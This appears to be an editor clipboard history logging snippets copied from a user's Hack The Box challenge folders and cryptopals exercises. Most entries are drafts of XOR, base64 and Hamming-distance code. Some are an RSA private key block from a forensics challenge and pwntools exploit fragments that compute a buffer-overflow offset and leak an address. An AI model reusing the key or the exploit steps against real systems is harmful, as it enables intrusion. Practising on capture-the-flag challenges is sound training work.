	EJjoYQi8QEb4qYJDKtJXWK11BuQG35A0wH6aeOcWW2oJwQfggoZjhsIhnIG22+ 
	OqjWHYaZ00bBmczz0i2r7Qh6iq4sEAdi0Vo8PR+N/L95WYWdrLQDNyxtdtwH4n 
	qWYPraSIUSPIPRYIsrh55T0/LfpBudMAkVtHlnnG0InBMFAIhCSsSFC9g1GgZz 
	WRnfUJDg+XhKxrmjhlNdu0GSIcB+m8GkfYHvXhfNVE0iV9QS33zPxUj6t+msI4 
	nZxXrhDJtmtGF/AWbRhmWYObpNsLnqJAg0AF145ExDW3Bwg+lx97W5ox29i/is 
	toLXP3LPluONseQU72PW4ts34FBc0+93SYkGcBYEbeTiNjhX232JiW5febDxQa 
	54UWLDPncBubJwlasiGfWCLMD5uJ8V3fpTzGCGoAxAO28U585zBNHLeMrqcz0Q 
	8Z87ZEvKNq2JEO13p9cUH8fXLIvgSfAUwmCuEZY9HAI5YH/nASRUOIvORPnUWY 
	0RK9wUqUq7Xtc8J+5C5obxkpVvOevOQh0UCTOo68EmBwMb7vEiOu+FgpKz3FId 
	GwrKaZpdK/OL+0YAgHnuX+WM7yLaB++HRaHQqW3yaqPVQYCiLp32fmX0vgyBo3 
	oqZHYGkVIdH9trCkNWSjqumeb2W1PEjMgEwW9UqbOrjtzcaiCVT6PPZ0HZPTQD 
	tm5fXz446Wg2qNddxpHuPHUSnZvWztZiueB+hk6P5+TFJUfDvGg/Qu31Omr7/+ 
	l9XEfSSOH7AMf0HcUfDq6MWGyCyplmVHOlDxuC3NmQvzNz76WuCiOVQFe/71KT 
	acVlk5L8KpkxvyMvi7rfnUQCdHJxj00iUsf0cL0ebxHwXgGGn8tuFicBoFSv0B 
	FhcYhWJwK1RKtHFf8IrEX67p3H/xrf0UScfjvrYqn+7VouxQPshg7ueVJdgM6N 
	KBl0jtgO1lyW3P4VtSDLZjf5EFxLM17XIsXoNqSDenXOv5HrbTAVHzvBB3ev3D 
	SMz9kwJPAy6z6pnCtS6sZuxKjxhuXJKgarUdqoY+jzL8zta0f6+4JORe80wef6 
	BLAU/qC3ixGnaOrYRH5zVARur4CAsbme/PiqPqFX3MHLdh/7EALmEQWuQ6q1Yv 
	OO3FAu3RKoaUUdM9i2lPpg/9q0hI8YuBfBjTg2ep4MFf7MaPXwIk6j9BMs9Xf4 
	gpkFrFwJmieKMRq8VqfayqpJ+/koTQeXQ/ZiCp7Ca3suC/UFhng6mRdVaOUTnx 
	PKxsBH750CqPCKfAXngmuDYh7aAyKDryRYzl4YYj8Sx/z9PA7F5rBB4zuiEWnY 
	u8MSobiv8DfkUM0hf8/ivwD 
	----END RSA PRIVATE KEY----- 
	
b97c5d06bc8e94bcc88e7da05523f288|file:///home/neo/hackthebox/forensics/secret-recipe/rsa_private.key|1|1|V|
	-----BEGIN RSA PRIVATE KEY-----
184d963b40dc7890892b66c5c37f9991|file:///home/neo/hackthebox/forensics/secret-recipe/rsa_private.key|54|1|V|
	2u8MSobiv8DfkUM0hf8/ivwD
	-----END RSA PRIVATE KEY-----
c726e582083e1be11e5654752be9e561|file:///home/neo/hackthebox/forensics/secret-recipe/rsa_private.key|55|1|V|
	-----END RSA PRIVATE KEY-----
13042543a896f98315ab81351d4996a9|file:///home/neo/hackthebox/pwn/little-tommy/exploit.py|47|1|V|python
	io.recvuntil("nu")
4468f0f7b38022e907492299cc2dee21|file:///home/neo/hackthebox/pwn/little-tommy/exploit.py|45|1|V|python
	io.recvuntil("Please enter an operation number: ")
9f6598d1df339bbbeb9dcb7896f3fc70|file:///home/neo/hackthebox/pwn/little-tommy/exploit.py|46|1|V|python
	io.recvuntil("number:")
c485d1f0d3b6b2b0641f9dbc3381ed65|file:///home/neo/hackthebox/pwn/little-tommy/exploit.py|45|1|V|python
	io.recvline_contains("number", False)
b2ebd4614bd2f0f13a6ba36b310886d6|file:///home/neo/hackthebox/pwn/little-tommy/exploit.py|46|1|V|python
	line = io.recvline_contains("number", False)
b0af4614bb7298b11b21caba7d6e22bb|file:///home/neo/hackthebox/pwn/little-tommy/exploit.py|48|1|V|python
	line = io.recvline_startswith("Please")
7ebc40575aafe260fe2db6aed8e4d80c|file:///home/neo/hackthebox/pwn/little-tommy/exploit.py|45|1|V|python
	line = io.recvline()
	line = io.recvline()
	line = io.recvline()
	line = io.recvline()
	line = io.recvline()
	line = io.recvline()
	line = io.recvline()
	line = io.recvline()
	line = io.recvline()
b6e6ab12c0600b686c0119d7211bf46c|file:///home/neo/cryptopals/set1/set1.py|3|1|V|python
	if __name__ == '__main__'
5060a9ba0f80cd0850b60ab38c78f2a2|file:///home/neo/cryptopals/set1/set1.py|9|1|V|python
	    input_hex = int(input_str, 16)
23503f1ace2762ccb5937f2be0bd76ae|file:///home/neo/cryptopals/set1/set1.py|5|12|v|python
	hexstring.decode("hex").encode("base64")
3b6deb5572df2d3ddd663e1d6b64f4dc|file:///home/neo/cryptopals/set1/set1.py|16|1|V|python
	    input1 = input("Give first hex")
ae7916e7d295523120ab795e1336e09a|file:///home/neo/cryptopals/set1/set1.py|11|1|V|python
	    return (str1 ^ str2)
d7b5808c3f443eb5a496225468c7e4a5|file:///home/neo/cryptopals/set1/set1.py|12|28|v|python
	str1
1c10fe9d0e26b34e3f1c8542c457ba8d|file:///home/neo/cryptopals/set1/set1.py|12|38|v|python
	hex2
4600bec5dd612a236245e4ccfe4e10c3|file:///home/neo/cryptopals/set1/set1.py|13|26|v|python
	''.join((chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(str1, str2))), 'hex'
0ec7dbd0f0a6a8cd2b1953ff22080b40|file:///home/neo/cryptopals/set1/set1.py|12|80|v|python
	, 'hex'
6935456d8d68a34195cf550ca62c0b43|file:///home/neo/cryptopals/set1/set1.py|13|12|v|python
	codecs.encode(bytes(xored_str), 'hex')
acad26d56c525cbc9e225de7de068cc2|file:///home/neo/cryptopals/set1/set1.py|14|12|v|python
	xored_str.hex() 
08cf45172f7f07c9becbf506f07c65d7|file:///home/neo/cryptopals/set1/set1.py|20|14|V|python
	    input1 = input("Give first hex string: ")
	    input2 = input("Give second hex string: ")
7c06387940c7d51010b904d4160247ba|file:///home/neo/cryptopals/set1/set1.py|11|12|v|python
	codecs.decode(str1, 'hex')
e101f5cca09d870fd8735c7bc5da4ac8|file:///home/neo/cryptopals/set1/set1.py|12|5|V|python
	    hex2 = codecs.decode(str2, 'hex')
1203cb492b2204f419603100bb354ef9|file:///home/neo/cryptopals/set1/set1.py|11|1|V|python
	    hex1 = binascii.unhexlify(str1)
b0be6d6369f8cdf39c3cc3a29af26703|file:///home/neo/cryptopals/set1/set1.py|14|12|v|python
	binascii.hexlify(xored_str.encode('hex'))
24c9ddb7ff9b7a15deefa233312346fa|list:/diagnostics|5|1|V|list
	set1.py:14:29	Error	[pylint E0602] Undefined variable 'xored_str' (undefined-variable)
	set1.py:11:5	Warning	[pylint W0612] Unused variable 'hex1' (unused-variable)
	set1.py:12:5	Warning	[pylint W0612] Unused variable 'hex2' (unused-variable)
	set1.py:13:5	Warning	[pylint W0612] Unused variable 'xored_hex' (unused-variable)
c353883b73e3284c0f6c89bf05696f89|file:///home/neo/cryptopals/set1/set1.py|13|1|V|python
	    # xored_hex = codecs.encode(''.join((chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(str1, str2))), 'hex')
9d34753679ce5a833b2d9853e68a0781|file:///home/neo/cryptopals/set1/set1.py|14|17|v|python
	codecs.encode(''.join((chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(str1, str2))), 'hex')
71b1b7d8e010a7bf9ca6c9b2367fe86f|file:///home/neo/cryptopals/set1/set1.py|15|12|v|python
	(hex1 ^ hex2)
e9cf57d6eed99bd752c98987f571b259|file:///home/neo/cryptopals/set1/set1.py|13|1|V|python
	    print(hex1)
5269bcb43006594b9d207922e9dd94d5|file:///home/neo/cryptopals/set1/set1.py|11|1|V|python
	    hex1 = int(str1, 16)
7b529034f34077ca991ad818e6538fe6|file:///home/neo/cryptopals/set1/set1.py|23|19|v|python
	input("Give hex string: ")
477dda43913385293676823ebef94c6d|file:///home/neo/cryptopals/set1/set1.py|14|38|V|python
	    # hex1 = binascii.unhexlify(str1)
	    # hex2 = binascii.unhexlify(str2)
	    # print(hex1)
	    # print(hex2)
	    # # xored_hex = codecs.encode(''.join((chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(str1, str2))), 'hex')
	    # xored_hex = [ord(c1) & ord(c2) for c1, c2 in zip(hex1,hex2)] 
	    # return ''.join(xored_hex)
fd90259fbb6172cc8ba74c509573b8d3|file:///home/neo/cryptopals/.git/config|7|8|v|gitconfig
	https://github.com/neochristou/cryptopals
4394110c33b8afaee44c779a4f104078|file:///home/neo/cryptopals/set1.py|16|1|V|python
	    # Challenge 1
	    # input_str = '49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d' 
	    # print(hex_to_base64(input_str))
edaa13e9b09f9c99b186693bb9f7e872|file:///home/neo/cryptopals/set1.py|28|4|V|python
	    # print(hex_to_base64(input_str))
82bba68e99a93e8e2dd3dc9a79eb2a35|file:///home/neo/.vimrc|234|1|V|vim
	let g:python.jediPath
25a1f043f22d448e08174863f7944d4d|file:///home/neo/.config/coc/extensions/node_modules/coc-python/lib/index.js|113998|26|v|javascript
	.local/lib/python2.7/site-packages/jedi
c1a745ad10f86a146ec475e0abcf10df|file:///home/neo/.config/coc/extensions/node_modules/coc-python/lib/index.js|113999|1|v|javascript
	.local/lib/python3.7/site-packages/jedi/
8a9d17e56227d846277781ce800262cf|file:///home/neo/cryptopals/set1.py|16|5|V|python
	    # for i in range(256):
fb8852b4f8f142473a874b9e0a0bfb41|file:///home/neo/cryptopals/set1.py|19|9|V|python
	        xored_num = ''.join([chr(char ^ i) for char in hexnum])
afc3cab3c111a8abca13fe92d368197a|file:///home/neo/cryptopals/set1.py|20|9|V|python
	        # print(xored_num)
d19373f0fb64dec7319fea6d97100a40|file:///home/neo/cryptopals/set1.py|20|12|v|python
	isPrintable(xored_str)
4f69e77cb7188ff6ec9e07c28c9be217|file:///home/neo/cryptopals/set1.py|23|19|v|python
	xored_str
a926d636d5958edad3e81a57c4112a17|file:///home/neo/cryptopals/set1.py|24|2|V|python
	            print(xored_str)
739e459b670baf5dc16c4516adb309dc|file:///home/neo/cryptopals/set1.py|6|12|v|python
	codecs.encode(codecs.decode(hexstring, 'hex'), 'base64').decode()
95a1446a7120e4af5c0c8878abb7e6d2|file:///home/neo/cryptopals/set1.py|17|59|v|python
	base64
4b719acee4a1d5e30577f59e80d06205|file:///home/neo/cryptopals/set1.py|32|19|v|python
	encoded
ee09d91a291b3131d6b122578e90d537|file:///home/neo/cryptopals/set1.py|15|1|V|python
	def isEnglish(s):
	    try:
	        codecs.encode(codecs.decode(hexstring, 'utf-8'), 'ascii').decode()
	        # s.encode(encoding='utf-8').decode('ascii')
	    except UnicodeDecodeError:
	        return False
	    else:
	        return True
eb3c55ffd8acd66e6fbd3fe90b80d7be|file:///home/neo/cryptopals/set1.py|22|1|V|python
	            # utf8_str = codecs.decode(bytes(xored_str), 'utf-8')
	            # encoded = codecs.encode(utf8_str, 'ascii')
8ac9dd656cfbc069e1548aff74c32f3c|file:///home/neo/cryptopals/set1.py|22|13|V|python
	            is_eng = xored_str.translate(string.punctuation).isalnum()
b953e378ffd5c8519249f5f487fc2a07|file:///home/neo/cryptopals/set1.py|22|9|V|python
	        if xored_str.isprintable():
cb3a9de16a9e5c7ea6aa6d1c6c04a3df|file:///home/neo/cryptopals/set1.py|21|1|V|python
	    print(hexnum)
d39c276f3263f5de18471fc07aec4ccc|file:///home/neo/.zshrc|135|1|V|zsh
	alias python="ipython"
d77564e409d8b6a5117d758c4225995d|file:///home/neo/cryptopals/set1.py|31|5|V|python
	    print(string_scores)
a6a2c71472f275100334ffc05f3d4716|file:///home/neo/cryptopals/set1.py|40|33|v|python
	.strip('\n')
d98615e8905f594ec522e470b762df1e|file:///home/neo/cryptopals/set1.py|42|4|V|python
	        print(line)
b12ad0d249bb88360819c63726df4f2c|file:///home/neo/cryptopals/set1.py|43|9|V|python
	        print(single_byte_xor(line))
416f2dade05da8868b57fc0c1910f4ec|file:///home/neo/cryptopals/set1.py|32|27|V|python
	    # for word in sorted(string_scores, key=string_scores.get, reverse=True):
	    #     final_list += word + str(string_scores[word]) + "\n"
dbbc1ded5ebad1a91259a65c21d0f2b8|file:///home/neo/cryptopals/set1.py|30|1|V|python
	            #     string_scores[xored_str] = score
f50cfd0017fd8aae2e980324ebb6c278|file:///home/neo/cryptopals/set1.py|31|4|V|python
	            string_scores[xored_str] = score
5e3202f9c2a951cb910c3862e21122c4|file:///home/neo/cryptopals/set1.py|41|9|V|python
	        if len(words) > 0:
95e2998724a8380e5464584fb62f1b2d|file:///home/neo/cryptopals/set1.py|42|19|v|python
	wori
6e9d3411da89ff3059f929b83bda069a|file:///home/neo/cryptopals/set1.py|41|9|V|python
	        print(words)
b1f9911e12ff84e67fa1a66a772478a1|file:///home/neo/cryptopals/set1.py|41|9|V|python
	        for word in words:
6b369e8e9fb430775d440bbea59f6c56|file:///home/neo/cryptopals/set1.py|41|9|V|python
	        print(word)
e46a9fec5ba9e2b7dce6ac88e7efaf49|file:///home/neo/cryptopals/set1.py|30|1|V|python
	                string_scores[xored_str] = score
e2269149144c763765796c2f8f9fdff0|file:///home/neo/cryptopals/set1.py|19|5|V|python
	    # hexnum = binascii.unhexlify(hexstring)
64876d6b3cdeb9d6edc57f1968b7b990|file:///home/neo/cryptopals/set1.py|22|1|V|python
	        xored_str = ''.join([chr(char ^ i) for char in hexnum])
1f7124263c0e401e3de00a06ec614580|file:///home/neo/cryptopals/set1.py|23|26|v|python
	.join([bytes(char ^ i) for char in hexnum])
ccf162280951371c4746763ad047f1e9|file:///home/neo/cryptopals/set1.py|26|9|V|python
	        print(xored_bytes)
bbd136531ed32b091896479376a1e167|file:///home/neo/cryptopals/set1.py|26|21|v|python
	codecs.decode(xored_bytes, 'utf-8')
a6ccac409325bdd662cc15c81d870044|file:///home/neo/cryptopals/set1.py|30|1|V|python
	        if xored_str.isprintable():
	            score = 0
	            words = xored_str.split()
	            for word in words:
	                if dictionary.check(word):
	                    score += 1
	            if score > 0:
	                string_scores[xored_str] = score
d74824f50ff6c615a15388952b3e0e11|file:///home/neo/cryptopals/set1.py|35|1|V|python
	                    string_scores[xored_str] = score
4916a137c54d4023e0ed313ca2a263e1|file:///home/neo/cryptopals/set1.py|28|13|V|python
	            if xored_str.isprintable():
dd573ccdfc0f701ce74eefba81536c22|file:///home/neo/cryptopals/set1.py|33|25|V|python
	            if score > 0:
	                string_scores[xored_str] = score
45b7b1e631036b86e72dbbe31bb74d3a|file:///home/neo/cryptopals/set1.py|47|1|V|python
	    for line in lines:
	        words = single_byte_xor(line)
	        if len(words) > 0:
	            print(words)
593ba37613b0ea14545e89b62a9a3fb2|file:///home/neo/cryptopals/set1.py|45|17|V|python
	        if len(words) > 0:
	            print(words)
c19529b4c195abab8d88ab3e5308ebb4|file:///home/neo/cryptopals/set1.py|46|5|V|python
	    for 
89759e1284e2479b991d2669de104942|file:///home/neo/cryptopals/set1.py|45|30|v|python
	words
9401a22d07d980b32cce71267b83b526|file:///home/neo/cryptopals/set1.py|38|1|V|python
	    final_list = '\n'.join((word + " [score: " + str(string_scores[word]) + "]") for word in sorted(string_scores, key=string_scores.get, reverse=True))
fd6c3bce30d8c78bdc9fb7524eec6046|file:///home/neo/cryptopals/set1.py|47|5|V|python
	    for sentence in sorted(all_sentences, key=all_sentences.get, reverse=True):
c47d187067c6cf953245f128b5fde62a|file:///home/neo/cryptopals/set1.py|46|97|v|python
	word
718b14be26a8a6f5185f44e44cdc6ce3|file:///home/neo/cryptopals/set1.py|46|116|v|python
	string_scores
42a27903afe1d5c2654d6c30f480fc6e|file:///home/neo/cryptopals/set1.py|49|12|v|python
	sorted_scores
821adde4b1056b564624ab080b0c4f1a|file:///home/neo/cryptopals/set1.py|45|9|V|python
	        print(line_sentences)
13c0642b86c195da55ed868a0fd8c288|file:///home/neo/cryptopals/set1.py|47|9|V|python
	    # for sentence in sorted(all_sentences, key=all_sentences.get, reverse=True):
	    #     print(sentence)
3bbfbcadd8c69d308b3b6f313854d093|file:///home/neo/cryptopals/set1.py|46|5|V|python
	    print(all_sentences)
961a635521baab2ff36f3ef9039f29ab|file:///home/neo/cryptopals/set1.py|37|5|V|python
	    # final_list = ""
addd973f75ca547b3570b323beb432da|file:///home/neo/cryptopals/set1.py|38|5|V|python
	    # return final_list
6ef32db5e3a9ec19a250ff7c99796a38|file:///home/neo/cryptopals/set1.py|37|5|V|python
	    # final_list = '\n'.join((word + " [score: " + str(string_scores[word]) + "]") for word in sorted(string_scores, key=string_scores.get, reverse=True))
f37588fab746e4ced54ec3a9db6ffa21|file:///home/neo/cryptopals/set1.py|55|5|V|python
	    so    
571667d2ce6d0fc9c65eb70ac5da36b9|file:///home/neo/cryptopals/set1.py|55|94|v|python
	ed(string_scores, key=string_scores.get, reverse=True
cc7c803f911d08167e8dee930d20e1d2|file:///home/neo/cryptopals/set1.py|55|5|V|python
	    string_scores = sing
830a4199a97133b693760da2e3ec3f4a|file:///home/neo/cryptopals/set1.py|56|5|V|python
	    # print(single_byte_xor('1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736'))
8ceeaf636e3b28dcccc42c4dd07100bb|file:///home/neo/cryptopals/set1.py|48|12|v|python
	all_sentences
752cd9e939f5cb7753ec09cc74a892b5|file:///home/neo/cryptopals/set1.py|47|5|V|python
	    sorted_scores = '\n'.join((sentence + " [score: " + str(all_sentences[sentence]) + "]") for sentence in sorted(all_sentences, key=all_sentences.get, reverse=True))
b40363b407246a4c493d7428244a7cfd|file:///home/neo/cryptopals/set1.py|46|13|v|python
	all_sentences.update(line_sentences)
d866f4a8ea8e6f9d0f456f54c26285c0|file:///home/neo/cryptopals/set1.py|30|17|v|python
	sentence
28e3928c1ae4c99f14f19822c571eb64|file:///home/neo/cryptopals/set1.py|22|9|V|python
	        # xored_str = ''.join([chr(char ^ i) for char in hexnum])
ff50058b2dcc1b5620aea3016bf4207c|file:///home/neo/cryptopals/set1/set1.py|52|5|V|python
	    print(keystream)
969d25e63bd893ea2ffa2e0d49bb7f10|file:///home/neo/cryptopals/set1/set1.py|54|5|V|python
	    for i in range
36f6adeee619d5d8b1101029bc5e11b4|file:///home/neo/cryptopals/set1/set1.py|55|28|v|python
	(ord(plaintext[i]) ^ ord(keystream[i]))
1af946e694a6527303bf205bfbb92794|file:///home/neo/cryptopals/set1/set1.py|57|29|v|python
	ord(plaintext[i]) ^ ord(keystream[i])
c4b6e0a9d88f18b0dc70bfbe82db9c62|file:///home/neo/cryptopals/set1/set1.py|60|12|v|python
	int(ciphertext, 16)
e8cf7eecf3eff1d15fde31bcc8f3e135|file:///home/neo/cryptopals/set1/set1.py|15|1|V|python
	    return '{:x}'.format(hex1 ^ hex2)
ec71e1920480efafea79513edff8e540|file:///home/neo/cryptopals/set1/set1.py|61|5|V|python
	    return hexstring.decodeg)
30d1b47668e55d2e99f3d945b6a5d185|file:///home/neo/cryptopals/set1/set1.py|60|26|v|python
	hex1 ^ hex2
5e20b5a8fc1b4d5873afac10c754945f|file:///home/neo/cryptopals/set1/set1.py|59|5|V|python
	    print(ciphertext)
011bab9df9caff42b18ac5a2d44614b6|file:///home/neo/cryptopals/set1/set1.py|59|5|V|python
	    # return '{:x}'.format(ciphertext)
86ed62043827061fb58d486486223803|file:///home/neo/cryptopals/set1/set1.py|58|5|V|python
	    # ciphertext = ''.join(bytes[ord(c1) ^ ord(c2)] for c1, c2 in zip(plaintext, keystream))
2770e7eea2d50a4cd4565db0aeb5f4c3|file:///home/neo/cryptopals/set1/set1.py|12|1|V|python
	    if len(hexstring1) != len(hexstring2):
	        raise Exception('Strings must have the same length')
49609dbf435c75bf4d2b4a4e0df640f8|file:///home/neo/cryptopals/set1/set1.py|62|12|v|python
	hexstring1
3c654c509a94b9c7e0d07b13365263ad|file:///home/neo/cryptopals/set1/set1.py|62|25|v|python
	hetistring2
6c6d3d14f02ec7b722b35de0b96b0787|file:///home/neo/cryptopals/set1/set1.py|67|1|V|python
	        bin1 = str1 >> i & 1
f552fd43935fdf7b0ce1d08ce168df24|file:///home/neo/cryptopals/set1/set1.py|64|5|V|python
	    bitarr = bitarray.bitarray()
f2ad8d0e804c6e6db83d0caae4545e73|file:///home/neo/cryptopals/set1/set1.py|6|1|V|python
	import bitarray
9daf04dfa5c4088068ef64d630e00793|file:///home/neo/cryptopals/set1/set1.py|74|5|V|python
	    print('test')
d4299359940d6173492b6801ce320011|file:///home/neo/cryptopals/set1/set1.py|65|1|V|python
	    bytes1 = bytes(str1)
9441238d043b9c1f4a73b1bac9430fe7|file:///home/neo/cryptopals/set1/set1.py|63|1|V|python
	    # length = len(str1)
	    # dist = 0
2a6d07eef8b10b84129b42424ed99327|file:///home/neo/cryptopals/set1/set1.py|74|12|v|python
	dist
0876791dbd2870db88919fbed7524b8f|file:///home/neo/cryptopals/set1/set1.py|72|15|v|python
	bin(str1)
87ce92009a6122e2fb177e6e8f815c03|file:///home/neo/cryptopals/set1/set1.py|73|5|V|python
	    binary2 = bin(str2)
0494273a2716ef73b4e8aa81e90f5364|file:///home/neo/cryptopals/set1/set1.py|72|1|V|python
	    binary1 = ''.join(format(ord(c), 'b') for c in str1)
98ac36c86782c7dfbf71376d5c2ae793|file:///home/neo/cryptopals/set1/set1.py|74|5|V|python
	    print(binary1)
88ff479a449b36e984cecc9959c0d7ea|file:///home/neo/cryptopals/set1/set1.py|74|9|V|python
	        dist += not
4a27723b56cb447003cb081bb626e633|file:///home/neo/cryptopals/set1/set1.py|73|5|V|python
	    for c1, c2 in zip(str1, str2):
e498c4c1c38bd8f31b77e4a6c8d9feaa|file:///home/neo/cryptopals/set1/set1.py|72|5|V|python
	    dist = 0
6dc84905d6df841d6f19153bd593e213|file:///home/neo/cryptopals/set1/set1.py|75|32|v|python
	str2
0ede0d1ee59c965de2f73c0bb709a783|file:///home/neo/cryptopals/set1/set1.py|77|12|v|python
	(binary1 & binary2).count('1')
7f1c664f225a87b97d13b0d5e0080e16|file:///home/neo/cryptopals/set1/set1.py|74|1|V|python
	    print(len(binary1))
d4ca85d1d059e866553a6e451d3d5831|file:///home/neo/cryptopals/set1/set1.py|73|1|V|python
	    binary1 = [bin(ord(c))[2:].zfill(8) for c in str1]
d33b6037b346a85fda437e7ef673e7f8|file:///home/neo/cryptopals/set1/set1.py|75|1|V|python
	    binary2 = [''.join(bin(ord(c))[2:].zfill(8)) for c in str2]
cab109df9550e999e2d5297381acf358|file:///home/neo/cryptopals/set1/set1.py|76|1|V|python
	    print(binary1)
	    print(len(binary1))
	    print(binary2)
	    print(len(binary2))
7f324371e1798528acadc8751ae7088b|file:///home/neo/cryptopals/set1/set1.py|73|5|V|python
	    binary1 = [bin(ord(c))[2:]]
3c277eb539288dcfbff64dc6836c1f5b|file:///home/neo/cryptopals/set1/set1.py|79|1|V|python
	if __name__ == '__main__':
60e9fe3f94676e11e069a0ded162ab14|file:///home/neo/cryptopals/set1/set1.py|1|1|V|python
	#!/usr/bin/python3
8ee50147728b5568f91a3720e638e703|file:///home/neo/cryptopals/set1/set1.py|103|1|V|python
	    # input_str = '49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d' 
	    # print(hex_to_base64(input_str))
e605a70d13cff3c8de4fe782e8dcf061|file:///home/neo/cryptopals/set1/chall1.py|2|8|v|python
	set1
054b4b9c985c9fc2d8d002bc7638d840|file:///home/neo/cryptopals/chall1.py|3|1|V|python
	importlib.import_module(set1)
631337081d681d62d5a1634a957777c7|file:///home/neo/cryptopals/set1/set1.py|63|1|V|python
	    # length = len(str1)
	    # dist = 0
	    # bytes1 = bytes(str1, 'utf-8')
	    # bytes2 = bytes(str2, 'utf-8')
	    # for i in range(length * 8):
	    #     bin1 = bytes1 >> i & 1
	    #     bin2 = bytes2 >> i & 1
	    #     dist += not(bin1==bin2)
	    #     print('test')
281d29ba328d8ce6115529fdc476d11f|file:///home/neo/cryptopals/set1/set1.py|72|4|V|python
	    ham = hamming('this is a test', 'wokka wokka!!!')
	    print(ham)
919d46fb6ac8c1e933bec8fb94b5ef3f|file:///home/neo/cryptopals/set1/set1.py|80|1|V|python
	    # enc_file = open('4.txt', 'r')
	    # lines = enc_file.read().splitlines()
5225aeda610a661bd4582b0fd12a293b|file:///home/neo/cryptopals/set1/set1.py|8|1|V|python
	    return codecs.encode(codecs.decode(hexstring, 'hex'), 'base64').decode()
46744049a962d9eefbcec293a26e0bdb|file:///home/neo/cryptopals/set1/set1.py|81|4|V|python
	    print(enc_text)
2460c456d518e4ee40aa8afdc1bf15ba|file:///home/neo/cryptopals/set1/set1.py|11|40|v|python
	exstring
9190d166c5eb1c98325f98ece40d03f2|file:///home/neo/cryptopals/set1/set1.py|3|8|v|python
	binascii
15b3ad009ee4dbf1889bd8041ac5e2e1|file:///home/neo/cryptopals/set1/set1.py|11|12|v|python
	codecs.encode(codecs.decode(base64string, 'base64'), 'hex').decode()
e93672311717bd122930aad16399d4e2|file:///home/neo/cryptopals/set1/set1.py|81|4|V|python
	    print(base64_to_hex('SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t'))
1848330e9d2d1f954ad5bac962d8020e|file:///home/neo/cryptopals/set1/set1.py|82|1|V|python
	    print(enc_hex)
7abb4b1b3c02580868b6309078a43d38|file:///home/neo/cryptopals/set1/set1.py|69|1|V|python
	            print(samples[i])
40d6ce113c9b987ef42a73e1230f1299|file:///home/neo/cryptopals/set1/set1.py|68|1|V|python
	            samples.append(ciphertext[i:i+keysize])
9e91ead749651714d47c9a980b12be3d|file:///home/neo/cryptopals/set1/set1.py|68|28|v|python
	ciphertext[i:i+keysize]
852264ac52aba6be81e7b4e93fc4556f|file:///home/neo/cryptopals/set1/set1.py|69|13|V|python
	            # samples.append(ciphertext[i:i+keysize])
a9a92beab8ebfcf1e557fbf7fdaee928|file:///home/neo/cryptopals/set1/set1.py|64|5|v|python
	smallest
2cfb33145e98cc61a56ff3d70e0950d1|file:///home/neo/cryptopals/set1/set1.py|52|1|V|python
	    length = len(plaintext)
	    repeats = length // len(key)
	    excess = length % len(key)
	    keystream = key * repeats + key[:excess]
f2bc5b1d869870d7688f71b2d87030bd|file:///home/neo/cryptopals/set1/set1.py|77|18|v|python
	plaintext
8b29bd1683b9677f88d620202cf23ab3|file:///home/neo/cryptopals/set1/set1.py|77|1|V|python
	    length = len(ciphertext)
	    repeats = length // len(key)
	    excess = length % len(key)
	    keystream = key * repeats + key[:excess]
639f2dfff0bf71ffd8baa570d14bd1db|file:///home/neo/cryptopals/set1/set1.py|77|14|v|python
	[[None]] * min_keysize
14511f2f5564650d129ca7cabc333278|file:///home/neo/cryptopals/set1/set1.py|79|13|v|python
	block
cb54616748fddc2fb607b9eb4312ee3d|file:///home/neo/cryptopals/set1/set1.py|71|28|v|python
	ciphertext
d8b822a4b8d2dfaf11c7d921112852a0|file:///home/neo/cryptopals/set1/set1.py|77|1|V|python
	    blocks = [[None] * min_keysize
	    for pos in range(min_keysize):
	        for block in range(0, len(ciphertext), keysize):
44d691132ca4e2ffe517011ab1964d9e|file:///home/neo/cryptopals/set1/set1.py|62|25|V|python
	                        print(c.u)
a47ef5c26b5da795b47507246e9700b8|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|45|28|v|python
	0x706e6e72
f8f96caac822788cb5473d82ce1d5581|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|46|22|v|python
	0x6161616c
0d2877d7c2eeac6dba230f7ee03c59c4|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|46|1|V|python
	OFFSET = cyclic_find(0x706e6e72)
bcf98e596c6fe9329ceb3692a976d23d|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|46|1|V|python
	log.info("Offset: %d" % OFFSET)
05b8c74cbd96fbf2de4c1a352702fbf4|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|8|34|v|python
	window
e7b3bf8c3fe20d4bfb20beb879e2566a|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|46|1|V|python
	io.recvuntil('Please dont hack me')
060be19de061f20d8c0278053984c7d7|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|49|1|V|python
	log.info("Line: %s" % line)
aca3dcd74b2f6dae3a958a578ba3d6ab|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|51|15|v|python
	line[-14:].ljust(16, '\x00')
7ad029bc2c921ccd250e1ad2953b70c2|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|53|1|V|python
	log.info("Address: %#x" % address)
5781662e0db3732e5c0bebf356fd64c4|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|52|1|V|python
	log.info("Address: %s" % addr)
3ef9a0d7fab5d2bcabf0978c0a35244e|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|54|26|v|python
	addr
30ab5361af5c3c95e8c588a8d810273d|file:///home/neo/cryptopals/set1/set1.py|110|5|V|python
	    print(min_keysize)
b631fa4af092c612bb5f6a7f003fbb1b|file:///home/neo/cryptopals/set1/set1.py|110|5|V|python
	    #TODO
9646690b35d44c4a560a6778c3f34e05|file:///home/neo/cryptopals/set1/set1.py|113|13|V|python
	            blocks.dd.append(ciphertext[i+j])
c47c368fe4b5252841d3c620c4e771a0|file:///home/neo/cryptopals/set1/set1.py|110|14|v|python
	list(list())
ddccb2e285377a6d95ec78db116f1508|file:///home/neo/cryptopals/set1/set1.py|110|14|v|python
	[[None] * min_keysize]
